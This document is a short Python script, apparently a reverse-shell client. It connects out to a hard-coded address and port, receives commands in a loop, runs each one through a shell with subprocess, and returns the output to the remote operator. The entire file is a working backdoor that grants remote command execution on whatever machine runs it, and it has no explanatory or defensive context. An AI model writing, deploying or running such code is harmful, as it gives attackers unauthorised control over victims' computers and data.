import socket
import os
import subprocess

host="192.168.1.102"
port=8090

client=socket.socket()
print("[-]Connetion Initiating.........")
client.connect((host,port))
print("[-] Connection Initiated")

while True:
    print("[-] Awaiting Command.....")
    command = client.recv(1024)
    command = command.decode()
    op= subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
    output=op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response ....")
    client.send(output + output_error)
